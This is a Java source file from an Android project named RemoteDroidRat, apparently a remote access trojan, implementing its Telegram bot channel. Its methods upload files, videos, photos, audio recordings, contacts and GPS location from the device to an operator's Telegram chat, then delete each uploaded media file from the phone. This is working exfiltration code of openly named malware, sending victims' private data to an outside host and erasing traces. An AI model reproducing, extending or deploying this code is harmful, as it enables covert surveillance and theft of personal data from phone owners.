package com.KaranKumar.RemoteDroidRat.telegramBot;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Arrays;
import android.text.TextUtils;
import java.util.ArrayList;
import java.util.concurrent.ScheduledExecutorService;
import android.os.Handler;
import android.os.Looper;
import java.util.concurrent.Executors;
import android.util.Base64;
import com.KaranKumar.RemoteDroidRat.EncoderDecoder.MorseCodeConverter;
import com.KaranKumar.RemoteDroidRat.adminInfo;

public class TelegramBotApi {

    private static final String TAG = "TelegramBotApi";
    private static final String YOUR_BOUNDARY = "YOUR_BOUNDARY"; // Change this as needed
    private adminInfo admin;

    private static  String botToken;
    private Context context;

    public TelegramBotApi(Context context) {
		if (context != null) {
			this.context = context;
			this.admin = new adminInfo(context);
			this.botToken = admin.getApiToken();

		} else {

		}
    }

    public void sendMessage(String chatId, String message) {
        new SendMessageTask().execute(chatId, message);
    }

    private class SendMessageTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            String chatId = params[0];
            String message = params[1];
            sendTextMessage(chatId, message);
            return null;
        }
    }



    public void sendFile(String chatId, String filePath) {
        new SendFileTask().execute(chatId, filePath);
    }

    private class SendFileTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            String chatId = params[0];
            String filePath = params[1];
            sendDocumentFile(chatId, filePath);
            return null;
        }
    }
	public void sendVideo(String chatId, String videoFilePath) {
		new SendVideoTask().execute(chatId, videoFilePath);
	}

	private class SendVideoTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... params) {
			String chatId = params[0];
			String videoFilePath = params[1];
			sendVideoFile(chatId, videoFilePath);
			return null;
		}
	}
	public void sendImage(String chatId, String imageFilePath) {
		new SendImageTask().execute(chatId, imageFilePath);
	}

	private class SendImageTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... params) {
			String chatId = params[0];
			String imageFilePath = params[1];
			sendImageFile(chatId, imageFilePath);
			return null;
		}
	}
	public void sendAudio(String chatId, String audioFilePath) {
		new SendAudioTask().execute(chatId, audioFilePath);
	}

	private class SendAudioTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... params) {
			String chatId = params[0];
			String audioFilePath = params[1];
			sendAudioFile(chatId, audioFilePath);
			return null;
		}
	}

	public void sendLocation(String chatId, double latitude, double longitude) {
		new SendLocationTask().execute(chatId, String.valueOf(latitude), String.valueOf(longitude));
	}

	private class SendLocationTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... params) {
			String chatId = params[0];
			double latitude = Double.parseDouble(params[1]);
			double longitude = Double.parseDouble(params[2]);
			sendLocationMessage(chatId, latitude, longitude);
			return null;
		}
	}

	public void sendPoll(String chatId, String question, List<String> options) {
		new SendPollTask().execute(chatId, question, TextUtils.join(",", options));
	}

	private class SendPollTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... params) {
			String chatId = params[0];
			String question = params[1];
			String options = params[2];
			sendPollMessage(chatId, question, options);
			return null;
		}
	}
	public void sendMediaGroup(String chatId, List<String> mediaFiles) {
		new SendMediaGroupTask().execute(chatId, TextUtils.join(",", mediaFiles));
	}

	private class SendMediaGroupTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... params) {
			String chatId = params[0];
			String mediaFiles = params[1];
			sendMediaGroupMessage(chatId, mediaFiles);
			return null;
		}
	}
	public void sendContact(String chatId, String phoneNumber, String firstName, String lastName) {
		new SendContactTask().execute(chatId, phoneNumber, firstName, lastName);
	}

	private class SendContactTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... params) {
			String chatId = params[0];
			String phoneNumber = params[1];
			String firstName = params[2];
			String lastName = params[3];
			sendContactMessage(chatId, phoneNumber, firstName, lastName);
			return null;
		}
	}
    
    public void sendBtnUrl(String chatId, String text, String link) {
        new SendContactTask().execute(chatId, text, link);
    }

    private class sendUrlBtn extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            String chatId = params[0];
            String text = params[1];
            String link = params[2];
            
            sendBtnLink(chatId, text, link);
            return null;
        }
	}



    // Add similar methods for sendAudio, sendVideo, sendLocation, sendInvoice, sendContact, sendMediaGroup, sendPoll

    private void sendTextMessage(String chatId, String message) {
        HttpURLConnection connection = null;
        try {
            if (isNetworkConnected()) {
                URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                String jsonInputString = String.format("{\"chat_id\": \"%s\", \"text\": \"%s\"}", chatId, message);

                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                Log.d(TAG, "Sending message: " + message + " To" + chatId);

                int responseCode = connection.getResponseCode();
                Log.d(TAG, "Response Code: " + responseCode);
            } else {
                Log.e(TAG, "Mobile network is not connected");
            }
        } catch (IOException e) {
            e.printStackTrace();
            Log.e(TAG, "IOException: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }



	private void sendDocumentFile(String chatId, String filePath) {
        HttpURLConnection connection = null;
        try {
            if (isNetworkConnected()) {
                File fileToSend = new File(filePath);
                String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendDocument?chat_id=" + chatId;

                URL url = new URL(apiUrl);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + YOUR_BOUNDARY);

                try (DataOutputStream dos = new DataOutputStream(connection.getOutputStream());
				FileInputStream fis = new FileInputStream(fileToSend)) {

                    dos.writeBytes("--" + YOUR_BOUNDARY + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + fileToSend.getName() + "\"\r\n");
                    dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        dos.write(buffer, 0, bytesRead);
                    }

                    dos.writeBytes("\r\n--" + YOUR_BOUNDARY + "--\r\n");
                }

                Log.d(TAG, "Sending file: " + filePath + " To" + chatId);

                int responseCode = connection.getResponseCode();
                Log.d(TAG, "Response Code: " + responseCode);
                
                // Check if the video was sent successfully (use appropriate HTTP status code)
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Delete the video file after successful sending
                    File FileToDelete = new File(filePath);
                    if (FileToDelete.delete()) {
                        Log.d(TAG, "Video file deleted successfully: " + filePath);
                    } else {
                        Log.e(TAG, "Failed to delete video file: " + filePath);
                    }
                }
         
            } else {
                Log.e(TAG, "Mobile network is not connected");
            }
        } catch (IOException e) {
            e.printStackTrace();
            Log.e(TAG, "IOException: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
	private void sendVideoFile(String chatId, String videoFilePath) {
		HttpURLConnection connection = null;
		try {
			if (isNetworkConnected()) {
				File videoFileToSend = new File(videoFilePath);
				String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendVideo?chat_id=" + chatId;

				URL url = new URL(apiUrl);
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("POST");
				connection.setDoOutput(true);
				connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + YOUR_BOUNDARY);

				try (DataOutputStream dos = new DataOutputStream(connection.getOutputStream());
				FileInputStream fis = new FileInputStream(videoFileToSend)) {

					dos.writeBytes("--" + YOUR_BOUNDARY + "\r\n");
					dos.writeBytes("Content-Disposition: form-data; name=\"video\"; filename=\"" + videoFileToSend.getName() + "\"\r\n");
					dos.writeBytes("Content-Type: video/mp4\r\n\r\n");

					byte[] buffer = new byte[8192];
					int bytesRead;
					while ((bytesRead = fis.read(buffer)) != -1) {
						dos.write(buffer, 0, bytesRead);
					}

					dos.writeBytes("\r\n--" + YOUR_BOUNDARY + "--\r\n");
				}

				Log.d(TAG, "Sending video: " + videoFilePath + " To" + chatId);

				int responseCode = connection.getResponseCode();
				Log.d(TAG, "Response Code: " + responseCode);
                // Check if the video was sent successfully (use appropriate HTTP status code)
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Delete the video file after successful sending
                    File FileToDelete = new File(videoFilePath);
                    if (FileToDelete.delete()) {
                        Log.d(TAG, "Video file deleted successfully: " + videoFilePath);
                    } else {
                        Log.e(TAG, "Failed to delete video file: " + videoFilePath);
                    }
                }
                
			} else {
				Log.e(TAG, "Mobile network is not connected");
			}
		} catch (IOException e) {
			e.printStackTrace();
			Log.e(TAG, "IOException: " + e.getMessage());
		} finally {
			if (connection != null) {
				connection.disconnect();
			}
		}
	}
    
    private void sendBtnLink(String text,String buttonUrl, String chatId){
        
        HttpURLConnection connection = null;
        try {
            if (isNetworkConnected()) {
                URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendMessage");
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                String jsonInputString = String.format("{\"chat_id\": \"%s\", \"text\": \"%s\", " +
                                                       "\"parse_mode\": \"Markdown\", \"reply_markup\": {\"inline_keyboard\": " +
                                                       "[[{\"text\":\"Click me\",\"url\":\"%s\"}]]}}", chatId, text, buttonUrl);

                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                Log.d(TAG, "Sending button message: " + text + " To " + chatId);

                int responseCode = connection.getResponseCode();
                Log.d(TAG, "Response Code: " + responseCode);
            } else {


            }
        } catch (IOException e) {
            e.printStackTrace();
            Log.e(TAG, "IOException: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }

        
    
    }
	private void sendImageFile(String chatId, String imageFilePath) {
		HttpURLConnection connection = null;
		try {
			if (isNetworkConnected()) {
				File imageFileToSend = new File(imageFilePath);
				String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendPhoto?chat_id=" + chatId;

				URL url = new URL(apiUrl);
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("POST");
				connection.setDoOutput(true);
				connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + YOUR_BOUNDARY);

				try (DataOutputStream dos = new DataOutputStream(connection.getOutputStream());
				FileInputStream fis = new FileInputStream(imageFileToSend)) {

					dos.writeBytes("--" + YOUR_BOUNDARY + "\r\n");
					dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + imageFileToSend.getName() + "\"\r\n");
					dos.writeBytes("Content-Type: image/jpeg\r\n\r\n");

					byte[] buffer = new byte[8192];
					int bytesRead;
					while ((bytesRead = fis.read(buffer)) != -1) {
						dos.write(buffer, 0, bytesRead);
					}

					dos.writeBytes("\r\n--" + YOUR_BOUNDARY + "--\r\n");
				}

				Log.d(TAG, "Sending image: " + imageFilePath + " To" + chatId);

				int responseCode = connection.getResponseCode();
				Log.d(TAG, "Response Code: " + responseCode);
                // Check if the video was sent successfully (use appropriate HTTP status code)
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Delete the video file after successful sending
                    File FileToDelete = new File(imageFilePath);
                    if (FileToDelete.delete()) {
                        Log.d(TAG, "Video file deleted successfully: " + imageFilePath);
                    } else {
                        Log.e(TAG, "Failed to delete video file: " + imageFilePath);
                    }
                }
			} else {
				Log.e(TAG, "Mobile network is not connected");
			}
		} catch (IOException e) {
			e.printStackTrace();
			Log.e(TAG, "IOException: " + e.getMessage());
		} finally {
			if (connection != null) {
				connection.disconnect();
			}
		}
	}
	private void sendAudioFile(String chatId, String audioFilePath) {
		HttpURLConnection connection = null;
		try {
			if (isNetworkConnected()) {
				File audioFileToSend = new File(audioFilePath);
				String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendAudio?chat_id=" + chatId;

				URL url = new URL(apiUrl);
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("POST");
				connection.setDoOutput(true);
				connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + YOUR_BOUNDARY);

				try (DataOutputStream dos = new DataOutputStream(connection.getOutputStream());
				FileInputStream fis = new FileInputStream(audioFileToSend)) {

					dos.writeBytes("--" + YOUR_BOUNDARY + "\r\n");
					dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + audioFileToSend.getName() + "\"\r\n");
					dos.writeBytes("Content-Type: audio/mpeg\r\n\r\n");

					byte[] buffer = new byte[8192];
					int bytesRead;
					while ((bytesRead = fis.read(buffer)) != -1) {
						dos.write(buffer, 0, bytesRead);
					}

					dos.writeBytes("\r\n--" + YOUR_BOUNDARY + "--\r\n");
				}

				Log.d(TAG, "Sending audio: " + audioFilePath + " to" + chatId);

				int responseCode = connection.getResponseCode();
				Log.d(TAG, "Response Code: " + responseCode);
                // Check if the video was sent successfully (use appropriate HTTP status code)
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Delete the video file after successful sending
                    File FileToDelete = new File(audioFilePath);
                    if (FileToDelete.delete()) {
                        Log.d(TAG, "Video file deleted successfully: " + audioFilePath);
                    } else {
                        Log.e(TAG, "Failed to delete video file: " + audioFilePath);
                    }
                }
			} else {
				Log.e(TAG, "Mobile network is not connected");
			}
		} catch (IOException e) {
			e.printStackTrace();
			Log.e(TAG, "IOException: " + e.getMessage());
		} finally {
			if (connection != null) {
				connection.disconnect();
			}
		}
	}

	private void sendLocationMessage(String chatId, double latitude, double longitude) {
		HttpURLConnection connection = null;
		try {
			if (isNetworkConnected()) {
				String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendLocation?chat_id=" + chatId +
                    "&latitude=" + latitude + "&longitude=" + longitude;

				URL url = new URL(apiUrl);
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("GET");

				Log.d(TAG, "Sending location: Latitude=" + latitude + ", Longitude=" + longitude + " To" + chatId);

				int responseCode = connection.getResponseCode();
				Log.d(TAG, "Response Code: " + responseCode);
			} else {
				Log.e(TAG, "Mobile network is not connected");
			}
		} catch (IOException e) {
			e.printStackTrace();
			Log.e(TAG, "IOException: " + e.getMessage());
		} finally {
			if (connection != null) {
				connection.disconnect();
			}
		}
	}

	private void sendPollMessage(String chatId, String question, String options) {
		HttpURLConnection connection = null;
		try {
			if (isNetworkConnected()) {
				String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendPoll?chat_id=" + chatId +
                    "&question=" + URLEncoder.encode(question, StandardCharsets.UTF_8.toString()) +
                    "&options=" + URLEncoder.encode(String.join(",", options), StandardCharsets.UTF_8.toString());

				URL url = new URL(apiUrl);
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("GET");

				Log.d(TAG, "Sending poll: Question=" + question + ", Options=" + options);

				int responseCode = connection.getResponseCode();
				Log.d(TAG, "Response Code: " + responseCode);
			} else {
				Log.e(TAG, "Mobile network is not connected");
			}
		} catch (IOException e) {
			e.printStackTrace();
			Log.e(TAG, "IOException: " + e.getMessage());
		} finally {
			if (connection != null) {
				connection.disconnect();
			}
		}
	}

	private void sendMediaGroupMessage(String chatId, String mediaFiles) {
		HttpURLConnection connection = null;
		try {
			if (isNetworkConnected()) {
				String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMediaGroup?chat_id=" + chatId +
                    "&media=" + URLEncoder.encode(mediaFiles, StandardCharsets.UTF_8.toString());

				URL url = new URL(apiUrl);
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("GET");

				Log.d(TAG, "Sending media group: Media Files=" + mediaFiles);

				int responseCode = connection.getResponseCode();
				Log.d(TAG, "Response Code: " + responseCode);
			} else {
				Log.e(TAG, "Mobile network is not connected");
			}
		} catch (IOException e) {
			e.printStackTrace();
			Log.e(TAG, "IOException: " + e.getMessage());
		} finally {
			if (connection != null) {
				connection.disconnect();
			}
		}
	}

	private void sendContactMessage(String chatId, String phoneNumber, String firstName, String lastName) {
		HttpURLConnection connection = null;
		try {
			if (isNetworkConnected()) {
				String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendContact?chat_id=" + chatId +
                    "&phone_number=" + URLEncoder.encode(phoneNumber, StandardCharsets.UTF_8.toString()) +
                    "&first_name=" + URLEncoder.encode(firstName, StandardCharsets.UTF_8.toString());

				if (lastName != null && !lastName.isEmpty()) {
					apiUrl += "&last_name=" + URLEncoder.encode(lastName, StandardCharsets.UTF_8.toString());
				}

				URL url = new URL(apiUrl);
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("GET");

				Log.d(TAG, "Sending contact: Phone Number=" + phoneNumber +
					  ", First Name=" + firstName +
					  ", Last Name=" + lastName + " To" + chatId);

				int responseCode = connection.getResponseCode();
				Log.d(TAG, "Response Code: " + responseCode);
			} else {
				Log.e(TAG, "Mobile network is not connected");
			}
		} catch (IOException e) {
			e.printStackTrace();
			Log.e(TAG, "IOException: " + e.getMessage());
		} finally {
			if (connection != null) {
				connection.disconnect();
			}
		}
	}


    

    // Repeat similar methods for sendImage, sendAudio, sendVideo, sendLocation, sendInvoice, sendContact, sendMediaGroup, sendPoll

    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }

	public static String decodeBase64(String base64Text) {
        byte[] decodedBytes = Base64.decode(base64Text, Base64.DEFAULT);
        return new String(decodedBytes, StandardCharsets.UTF_8);
    }
}


